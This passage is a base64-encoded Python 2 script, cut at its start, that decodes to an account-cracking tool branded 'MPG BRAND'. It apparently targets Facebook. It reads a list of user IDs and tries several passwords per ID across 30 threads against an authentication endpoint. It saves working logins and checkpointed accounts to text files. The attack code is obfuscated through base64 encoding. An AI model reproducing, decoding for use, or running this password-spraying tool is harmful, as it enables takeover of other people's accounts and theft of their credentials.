yIGxpbmUgaW4gb3BlbihpZGxpc3QgLCdyJykucmVhZGxpbmVzKCk6CgkgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCglleGNlcHQgSU9FcnJvcjoKCSAgICBwcmludCJbIV0gRmlsZSBOb3QgRm91bmQuIgoJICAgIHJhd19pbnB1dCgnUHJlc3MgRW50ZXIgVG8gQmFjay4gJykKCSAgICBjcmFjaygpCiAgICAKICAgIGVsaWYgYV9zID09ICcwJzoKICAgICAgICBtZW51KCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQgJycKICAgICAgICBwcmludCAnXHRDaG9vc2UgdmFsaWQgb3B0aW9uJyArIHcKICAgICAgICBhX3MoKQogICAgcHJpbnQgJyBUb3RhbCBpZHM6ICcgKyBzdHIobGVuKGlkKSkKICAgIHRpbWUuc2xlZXAoMC41KQogICAgcHJpbnQgJyBcMDMzWzE7OTJtQ3JhY2sgUnVubmluZ1wwMzNbMTs5NG0gJwogICAgdGltZS5zbGVlcCgwLjUpCiAgICBwcmludCA0NyAqICctJwogICAgcHJpbnQgJ1x0XDAzM1sxOzk1bUlUeiBNUEcgQlJBTkQgXDAzM1sxOzk0bScKICAgIHByaW50IDQ3ICogJy0nCiAgICAKICAgIGRlZiBtYWluKGFyZyk6CiAgICAgICAgdXNlciA9IGFyZwogICAgICAgICh1aWQsIG5hbWUpID0gdXNlci5zcGxpdCgnfCcpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vbG9jYWxob3N0OjUwMDAvYXV0aD9pZD0nICsgdWlkICsgJyZwYXNzPScgKyBwYXNzMSwgaGVhZGVycyA9IGhlYWRlcikudGV4dAogICAgICAgICAgICBxID0ganNvbi5sb2FkcyhkYXRhKQogICAgICAgICAgICBpZiAnbG9jJyBpbiBxOgogICAgICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5Mm1bTVBHLU9LXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzMQogICAgICAgICAgICAgICAgb2sgPSBvcGVuKCcvc2RjYXJkL2lkcy9NUlBfT0sudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgb2sud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMSArICdcbicpCiAgICAgICAgICAgICAgICBvay5jbG9zZSgpCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVpZCArIHBhc3MxKQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvciddOgogICAgICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5N21bTVBHLUNQXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzMQogICAgICAgICAgICAgICAgY3AgPSBvcGVuKCdNUlBfQ1AudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMSArICdcbicpCiAgICAgICAgICAgICAgICBjcC5jbG9zZSgpCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKHVpZCArIHBhc3MxKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2xvY2FsaG9zdDo1MDAwL2F1dGg/aWQ9JyArIHVpZCArICcmcGFzcz0nICsgcGFzczIsIGhlYWRlcnMgPSBoZWFkZXIpLnRleHQKICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWRzKGRhdGEpCiAgICAgICAgICAgICAgICBpZiAnbG9jJyBpbiBxOgogICAgICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTJtW01QRy1PS13inqQgJyArIHVpZCArICcgfCAnICsgcGFzczIKICAgICAgICAgICAgICAgICAgICBvayA9IG9wZW4oJy9zZGNhcmQvaWRzL01SUF9PSy50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMiArICdcbicpCiAgICAgICAgICAgICAgICAgICAgb2suY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkICsgcGFzczIpCiAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvciddOgogICAgICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTdtW01QRy1DUF3inqQgJyArIHVpZCArICcgfCAnICsgcGFzczIKICAgICAgICAgICAgICAgICAgICBjcCA9IG9wZW4oJ01SUF9DUC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMiArICdcbicpCiAgICAgICAgICAgICAgICAgICAgY3AuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQodWlkICsgcGFzczIpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9sb2NhbGhvc3Q6NTAwMC9hdXRoP2lkPScgKyB1aWQgKyAnJnBhc3M9JyArIHBhc3MzLCBoZWFkZXJzID0gaGVhZGVyKS50ZXh0CiAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMoZGF0YSkKICAgICAgICAgICAgICAgICAgICBpZiAnbG9jJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzkybVtNUEctT0td4p6kICcgKyB1aWQgKyAnIHwgJyArIHBhc3MzCiAgICAgICAgICAgICAgICAgICAgICAgIG9rID0gb3BlbignL3NkY2FyZC9pZHMvTVJQX09LLnR4dCcsICdhJykKICAgICAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMyArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgIG9rLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1aWQgKyBwYXNzMykKICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvciddOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtNUEctQ1Bd4p6kICcgKyB1aWQgKyAnIHwgJyArIHBhc3MzCiAgICAgICAgICAgICAgICAgICAgICAgIGNwID0gb3BlbignTVJQX0NQLnR4dCcsICdhJykKICAgICAgICAgICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMyArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQgKyBwYXNzMykKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vbG9jYWxob3N0OjUwMDAvYXV0aD9pZD0nICsgdWlkICsgJyZwYXNzPScgKyBwYXNzNCwgaGVhZGVycyA9IGhlYWRlcikudGV4dAogICAgICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkcyhkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnbG9jJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5Mm1bTVBHLU9LXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2sgPSBvcGVuKCcvc2RjYXJkL2lkcy9NUlBfT0sudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzNCArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvay5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVpZCArIHBhc3M0KQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvciddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5N21bTVBHLUNQXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3AgPSBvcGVuKCdNUlBfQ1AudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzNCArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcC5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcHMuYXBwcGVuZCh1aWQgKyBwYXNzNCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAKCgogICAgcCA9IFRocmVhZFBvb2woMzApCiAgICBwLm1hcChtYWluLCBpZCkKICAgIHByaW50IDQ3ICogJy0nCiAgICBwcmludCAnIFwwMzNbMTs5Mm1NUEcgQnJhbkQgIFBST0dSQU1NSU5HJwogICAgcHJpbnQgJyBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzk1bU9rXDAzM1sxOzkwbS9cMDMzWzE7OTdtQ3A6JyArIHN0cihsZW4ob2tzKSkgKyAnLycgKyBzdHIobGVuKGNwcykpCiAgICBwcmludCA0NyAqICctJwogICAgcmF3X2lucHV0KCcgXDAzM1sxOzkwbVByZXNzIGVudGVyIHRvIGJhY2snKQogICAgYXV0b19jcmFjaygpCgkKCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgcmVnKCkK"))
